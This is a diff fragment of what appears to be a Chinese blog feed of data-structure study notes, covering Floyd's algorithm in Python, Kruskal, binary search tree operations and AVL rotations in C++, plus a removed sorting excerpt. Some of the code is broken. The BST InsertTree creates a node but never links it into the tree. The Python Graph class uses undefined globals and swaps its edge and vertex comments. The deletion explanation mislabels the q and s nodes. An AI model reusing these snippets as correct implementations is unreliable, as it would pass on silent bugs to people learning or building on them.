+<h2 id="Floyd算法（佛洛依德算法）">Floyd算法（佛洛依德算法）</h2>
+<p>这是一个利用点来求得两点间路径最短的算法，它可以求出任意两点的最短距离。主要思路如下：将图中边的信息用邻接矩阵表达出来之后，依次比较两点的关系，查看是否有中间点的存在能使两点的距离变得更小，如果存在该中间点，则更新路径，注意一开始不能直接到达的点间距离设为无穷。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n=<span class="number">0</span>, e=<span class="number">0</span></span>):</span><br><span class="line">        self.<span class="built_in">list</span> = [<span class="string">&quot;a&quot;</span>*e]  <span class="comment">#点的集合</span></span><br><span class="line">        self.edge=[[INF]*e]</span><br><span class="line">        self.n = n<span class="comment">#边数量</span></span><br><span class="line">        self.e = e<span class="comment">#点数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">CreateAdjGraph</span>(<span class="params">self,n,e,a,b</span>):<span class="comment">#a表示节点名称，b表示邻接矩阵</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.e = e</span><br><span class="line">        self.<span class="built_in">list</span>=a</span><br><span class="line">        self.edge=b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">locateVex</span>(<span class="params">self,value</span>):<span class="comment"># 这一步是找到名称为value的点的下标</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):<span class="comment"># 遍历点集合</span></span><br><span class="line">            <span class="keyword">if</span> value==self.<span class="built_in">list</span>[i]:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment">#没找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Floyd</span>(<span class="params">self</span>):<span class="comment"># 寻找最小路径算法，anser是答案矩阵，表示任意两点的最小值。</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                anser[i][j]=self.edge[i][j]<span class="comment"># 初始状态边的权就是答案矩阵</span></span><br><span class="line">                <span class="keyword">if</span> anser[i][j]&lt;INF <span class="keyword">and</span> i!=j:</span><br><span class="line">                    pare[i][j]=i <span class="comment"># pare是前驱矩阵，表示从i到j的最短路径中j的前一个点。</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pare[i][j]=-<span class="number">1</span><span class="comment"># 从i到j不存在路径</span></span><br><span class="line"><span class="comment"># 三层循环2333</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                    <span class="keyword">if</span> anser[i][k]+anser[k][j]&lt;anser[i][j]:<span class="comment"># i到k到j比i到j距离短</span></span><br><span class="line">                        anser[i][j]=anser[i][k]+anser[k][j]<span class="comment"># 更新图信息</span></span><br><span class="line">                        pare[i][j]=pare[k][j]<span class="comment"># 将k点加入i到j路径中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):<span class="comment"># 分别输出两个矩阵，视情况而定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                <span class="built_in">print</span>(anser[i][j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                <span class="built_in">print</span>(pare[i][j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">FindTheLeast</span>(<span class="params">self,s,e</span>):<span class="comment">#s代表起点，e代表终点</span></span><br><span class="line">        <span class="keyword">global</span> route</span><br><span class="line">        <span class="keyword">if</span> pare[s][e]!=-<span class="number">1</span>:<span class="comment"># s到e连通</span></span><br><span class="line">            self.FindTheLeast(s,pare[s][e])<span class="comment"># 一直找到s到e中s的下一个点</span></span><br><span class="line">            route+=<span class="built_in">str</span>(self.<span class="built_in">list</span>[pare[s][e]])+<span class="string">&quot;------&gt;&quot;</span><span class="comment"># 加入答案</span></span><br><span class="line">            <span class="comment"># print(self.list[pare[s][e]],end=&quot;-----&gt;&quot;)</span></span><br><span class="line">        <span class="comment"># print(self.list[e])</span></span><br></pre></td></tr></table></figure>
+<h2 id="Kruskal算法实现最小生成树">Kruskal算法实现最小生成树</h2>
+<p>首先我们先知道一个最小生成树的性质：树中一定不会出现环，其边数等于顶点数减一</p>
+<p>这个算法采用边贪心策略，基本思路是隐去图中的所有边，这样所有的点都成为了一个个独立的块。然后对所有的边按照权来排序，排序结束后按照边权从小到大一条一条加入当前的最小生成树当中，如果成环则舍弃这个边，随后重复这个过程，知道边数等于总顶点数减一或者测试完所有边时结束。值得一提的是，如果结束之后最小生成树的边数小于总顶点数减1，说明该图不连通。</p>
+<h2 id="二叉搜索（查找）树">二叉搜索（查找）树</h2>
+<p>二叉搜索树的中序遍历具备有序性，因此二分查找树的查找效率较高。</p>
+<p>基本步骤：</p>
+<ul>
+<li>若整个树为空，查找失败，返回空指针</li>
+<li>若非空，将待查找值x和关键字T-&gt;data比较，若小于，查找左子树，大于，查找右子树</li>
+</ul>
+<p>前面的代码较简单，查找采用的是递归查找:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType data;</span><br><span class="line">	Node *lchild,*rchild;</span><br><span class="line">&#125;Node,*BSTree;</span><br><span class="line"></span><br><span class="line"><span class="function">BSTree <span class="title">Search</span><span class="params">(BSTree T,ElemType value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((!T)||value==T-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> T;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(value&lt;T-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Search</span>(T-&gt;lchild,value);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Search</span>(T-&gt;rchild,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertTree</span><span class="params">(BSTree &amp;T,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!T)</span><br><span class="line">	&#123;</span><br><span class="line">		BSTree S=<span class="keyword">new</span> Node;</span><br><span class="line">		S-&gt;data=e;</span><br><span class="line">		S-&gt;lchild=<span class="literal">NULL</span>;</span><br><span class="line">		S-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(e&gt;T-&gt;data) <span class="built_in">InsertTree</span>(T-&gt;rchild,e);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(e&lt;T-&gt;data) <span class="built_in">InsertTree</span>(T-&gt;lchild,e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateBST</span><span class="params">(BSTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T=<span class="literal">NULL</span>;</span><br><span class="line">	ElemType e;</span><br><span class="line">	cin&gt;&gt;e;</span><br><span class="line">	<span class="keyword">while</span>(e!=ENDFLAG)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">InsertTree</span>(T,e);</span><br><span class="line">		cin&gt;&gt;e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="删除">删除</h3>
+<p>删除就要分情况讨论，</p>
+<ol>
+<li>当待删除节点左子树为空时，其右子树子承父业代替其位置</li>
+<li>当待删除节点右子树为空时，其左子树子承父业代替其位置</li>
+<li>当待删除节点没有子节点，直接删除</li>
+<li>当待删除结点有两个非空子节点，一般是用<strong>左子树最大值和右子树最小值</strong>代替它，然后删除</li>
+</ol>
+<p>代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteBST</span><span class="params">(BSTree &amp;T,<span class="type">char</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//从二叉排序树T中删除关键字等于key的结点</span></span><br><span class="line">    BSTree p=T;BSTree f=<span class="literal">NULL</span>;</span><br><span class="line">    BSTree q;</span><br><span class="line">    BSTree s;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>; <span class="comment">//树为空则返回</span></span><br><span class="line">    <span class="keyword">while</span>(p)<span class="comment">//查找</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data==key) <span class="keyword">break</span>;  <span class="comment">//找到关键字等于key的结点p，结束循环</span></span><br><span class="line">        f=p;                <span class="comment">//f为p的双亲</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data&gt;key)</span><br><span class="line">            p=p-&gt;lchild; <span class="comment">//在p的左子树中继续查找</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p=p-&gt;rchild; <span class="comment">//在p的右子树中继续查找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="keyword">return</span>; <span class="comment">//找不到被删结点则返回</span></span><br><span class="line">    <span class="comment">//三种情况：p左右子树均不空、无右子树、无左子树</span></span><br><span class="line">    <span class="keyword">if</span>((p-&gt;lchild)&amp;&amp;(p-&gt;rchild))<span class="comment">//被删结点p左右子树均不空</span></span><br><span class="line">    &#123;</span><br><span class="line">        q=p;</span><br><span class="line">        s=p-&gt;lchild;</span><br><span class="line">        <span class="keyword">while</span>(s-&gt;rchild)<span class="comment">//在p的左子树中继续查找其前驱结点，即最右下结点</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=s;</span><br><span class="line">            s=s-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;data=s-&gt;data;  <span class="comment">//s的值赋值给被删结点p,然后删除s结点</span></span><br><span class="line">        <span class="keyword">if</span>(q!=p)</span><br><span class="line">            q-&gt;rchild=s-&gt;lchild; <span class="comment">//重接q的右子树</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q-&gt;lchild=s-&gt;lchild; <span class="comment">//重接q的左子树</span></span><br><span class="line">        <span class="keyword">delete</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;rchild)<span class="comment">//被删结点p无右子树，只需重接其左子树</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!p-&gt;lchild)<span class="comment">//被删结点p无左子树，只需重接其右子树</span></span><br><span class="line">        &#123;</span><br><span class="line">             q=p;</span><br><span class="line">             p=p-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*――――――――――将p所指的子树挂接到其双亲结点f相应的位置――――――――*/</span></span><br><span class="line">        <span class="keyword">if</span>(!f)</span><br><span class="line">            T=p;  <span class="comment">//被删结点为根结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(q==f-&gt;lchild)</span><br><span class="line">                f-&gt;lchild=p; <span class="comment">//挂接到f的左子树位置</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                f-&gt;rchild=p;<span class="comment">//挂接到f的右子树位置</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>删除的代码有点难以理解，最好是根据图像来理解，首先我们要清楚这里的f节点，p节点，q节点和s节点到底是什么，f节点是待删除节点的父亲节点，p节点是待删除节点，q节点是p节点的左子树的最右节点(有点逆天)，s节点是q节点的最右的值，图像如下：</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/27/363ec8d6850ffe48.png" alt=""></p>
+<p>通过这个图我们就可以看到删除的过程了，首先是找到s节点，它将是代替被删除节点的节点，当p节点被修改值之后就可以删除s节点了，当构建完q节点的右子树之后，p节点被删除，s节点取代p节点的位置，最后再修改f节点的指向即可。</p>
+<p>当然存在一种特殊情况：p的左子树里面没有右子树，这样的话p和q节点将代表了同一个节点，这时只需要将s替代掉p节点然后重接p节点的左子树即可。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/27/740b7c1d4bcf290d.png" alt=""></p>
+<h2 id="平衡二叉树（AVL树）">平衡二叉树（AVL树）</h2>
+<h3 id="概念">概念</h3>
+<p>二叉搜索树的查找，插入，删除的时间复杂度均线性正比于二叉搜索树的高度，因此高度越小，效率越高。首先得明白平衡二叉树的定义，或者说平衡二叉树的一些性质：</p>
+<ul>
+<li>左右子树的高度差的绝对值不超过1</li>
+<li>左右子树也是平衡二叉树</li>
+</ul>
+<p>另外节点左右子树的高度差称为平衡因子。</p>
+<p>知道平衡二叉树的定义之后我们开始插入平衡二叉树，我们在这个二叉树当中插入20。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/bac764c969739f01.png" alt=""></p>
+<p>插入后的二叉树如下，这时我们从新插入节点向上，找到最近的不平衡节点，即左右子树高度差值大于1，以该节点为根节点的树称为最小不平衡树，也就是说我们要将该不平衡树调整为平衡二叉树即可。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/8c261c6f6751cf21.png" alt=""></p>
+<p>基本结构代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">AVLNode</span>&#123;</span><br><span class="line">   <span class="type">int</span> data;</span><br><span class="line">   <span class="type">int</span> height;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">AVLNode</span> *lchild;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">AVLNode</span> *rchild;</span><br><span class="line">&#125;*AVLTree;</span><br><span class="line"></span><br><span class="line"><span class="function">AVLTree <span class="title">Empty</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//删除树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">Empty</span>(T-&gt;lchild);</span><br><span class="line">    <span class="built_in">Empty</span>(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">delete</span> T;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">Height</span><span class="params">(AVLTree T)</span><span class="comment">//计算高度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> T-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">updateHeight</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//更新高度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     T-&gt;height=<span class="built_in">max</span>(<span class="built_in">Height</span>(T-&gt;lchild),<span class="built_in">Height</span>(T-&gt;rchild))+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="调整方法">调整方法</h3>
+<p>知道要做什么之后，就要了解如何平衡这个树。调整平衡可以分为4种情况：LL, RR, LR, RL。</p>
+<h4 id="LL旋转">LL旋转</h4>
+<p>LL型的意思就是最近不平衡节点A和插入节点C之间的路径是两个左子树，即A的左子树的左子树为C。方法是将A顺时针旋转代替B的右子树位置，这时$T_3$空闲出来，A节点没有左子树，将被抛弃的子树$T_3$拼接到A的左子树即可。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/cc1bf19f534ecfc5.png" alt=""></p>
+<p>代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">LL_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//LL旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree temp=T-&gt;lchild;<span class="comment">//temp节点是B节点</span></span><br><span class="line">    T-&gt;lchild=temp-&gt;rchild;<span class="comment">//T3节点接到A节点的左子树</span></span><br><span class="line">    temp-&gt;rchild=T;<span class="comment">//A节点接到B节点的右子树</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(T);<span class="comment">//更新高度</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="RR旋转">RR旋转</h4>
+<p>RR型的概念理解如上，旋转方法是将A逆时针旋转取代B的左子树位置，将被抛弃的子树$T_2$放到A的右子树。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/bbb0eafce90fe8f4.png" alt=""></p>
+<p>代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">RR_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//RR旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AVLTree temp=T-&gt;rchild;</span><br><span class="line">    T-&gt;rchild=temp-&gt;lchild;</span><br><span class="line">    temp-&gt;lchild=T;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);<span class="comment">//更新高度</span></span><br><span class="line">    <span class="built_in">updateHeight</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="LR旋转">LR旋转</h4>
+<p>LR旋转需要分两次旋转，首先是将B做RR型旋转，后将A做LL型旋转。注意一下这里图因为方便看是移动了C节点，但实际上就是移动B到C下面并将C左子树拼接到B右子树。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/7d7fc1ddd22ec9aa.png" alt=""></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">LR_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//LR旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     T-&gt;lchild=<span class="built_in">RR_Rotation</span>(T-&gt;lchild);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="RL旋转">RL旋转</h4>
+<p>分两次旋转，B做L旋转，然后A再做R旋转。</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/28/b1f9a9f7d4ae58a9.png" alt=""></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">RL_Rotation</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//RL旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T-&gt;rchild=<span class="built_in">LL_Rotation</span>(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="算法步骤">算法步骤</h3>
+<ol>
+<li>在平衡二叉树中寻找x，如果查找失败，执行插入操作</li>
+<li>创建一个新节点p存储x，该节点双亲节点为f，高度为1。</li>
+<li>从双亲节点f出发，向上寻找最近的不平衡节点，逐层检查，如平衡更新高度，不平衡则判断类型并调整平衡。</li>
+</ol>
+<p>插入节点代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">Insert</span><span class="params">(AVLTree &amp;T,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="comment">//如果为空，创建新结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="keyword">new</span> AVLNode;</span><br><span class="line">        T-&gt;lchild=T-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">        T-&gt;data=x;</span><br><span class="line">        T-&gt;height=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x) <span class="keyword">return</span> T;<span class="comment">//查找成功，什么也不做，查找失败时才插入</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;T-&gt;data)<span class="comment">//插入到左子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;lchild=<span class="built_in">Insert</span>(T-&gt;lchild,x);<span class="comment">//注意插入后饭后结果挂接到T-&gt;lchild</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild)-<span class="built_in">Height</span>(T-&gt;rchild)==<span class="number">2</span>)<span class="comment">//插入后看是否平衡，如果不平衡显然是插入的那一边高度大</span></span><br><span class="line">        &#123;                                         <span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">            <span class="keyword">if</span>(x&lt;T-&gt;lchild-&gt;data)<span class="comment">//判断是LL还是LR,即插入的是lchild节点的lchild 还是rchild</span></span><br><span class="line">                T=<span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="built_in">LR_Rotation</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//插入到右子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;rchild=<span class="built_in">Insert</span>(T-&gt;rchild,x);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild)-<span class="built_in">Height</span>(T-&gt;lchild)==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x&gt;T-&gt;rchild-&gt;data)</span><br><span class="line">                T=<span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                T=<span class="built_in">RL_Rotation</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>删除节点代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">AVLTree <span class="title">adjust</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//删除结点后，需要判断是否还是平衡，如果不平衡，就要调整</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild)-<span class="built_in">Height</span>(T-&gt;rchild)==<span class="number">2</span>)<span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;lchild-&gt;lchild)&gt;=<span class="built_in">Height</span>(T-&gt;lchild-&gt;rchild))</span><br><span class="line">            T=<span class="built_in">LL_Rotation</span>(T);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=<span class="built_in">LR_Rotation</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild)-<span class="built_in">Height</span>(T-&gt;lchild)==<span class="number">2</span>)<span class="comment">//沿着高度大的那条路径判断</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Height</span>(T-&gt;rchild-&gt;rchild)&gt;=<span class="built_in">Height</span>(T-&gt;rchild-&gt;lchild))</span><br><span class="line">            T=<span class="built_in">RR_Rotation</span>(T);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=<span class="built_in">RL_Rotation</span>(T);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">AVLTree <span class="title">Delete</span><span class="params">(AVLTree &amp;T,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data==x)<span class="comment">//如果找到删除节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;rchild==<span class="literal">NULL</span>)<span class="comment">//如果该节点的右孩子为NULL,那么直接删除</span></span><br><span class="line">        &#123;</span><br><span class="line">            AVLTree temp=T;</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//否则，将其右子树的最左孩子作为这个节点，并且递归删除这个节点的值</span></span><br><span class="line">        &#123;</span><br><span class="line">           AVLTree temp;</span><br><span class="line">           temp=T-&gt;rchild;</span><br><span class="line">           <span class="keyword">while</span>(temp-&gt;lchild)</span><br><span class="line">              temp=temp-&gt;lchild;</span><br><span class="line">           T-&gt;data=temp-&gt;data;</span><br><span class="line">           T-&gt;rchild=<span class="built_in">Delete</span>(T-&gt;rchild,T-&gt;data);</span><br><span class="line">           <span class="built_in">updateHeight</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&gt;x)<span class="comment">//调节删除节点后可能涉及的节点</span></span><br><span class="line">        T-&gt;lchild=<span class="built_in">Delete</span>(T-&gt;lchild,x);</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;data&lt;x)</span><br><span class="line">        T-&gt;rchild=<span class="built_in">Delete</span>(T-&gt;rchild,x);</span><br><span class="line">    <span class="built_in">updateHeight</span>(T);</span><br><span class="line">	T=<span class="built_in">adjust</span>(T);</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
-  </entry>
-  <entry>
-    <title>基础算法01</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
-    <content><![CDATA[<p>这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
-<p>主要是：排序总结，高精度总结。</p>
-<span id="more"></span>
-<h3 id="排序模板">排序模板</h3>
-<h4 id="冒泡排序">冒泡排序</h4>
-<p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
-<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，…的排序，至此排序完成。</p>
-<p>核心代码如下:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
-<h4 id="快速排序">快速排序</h4>
-<p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
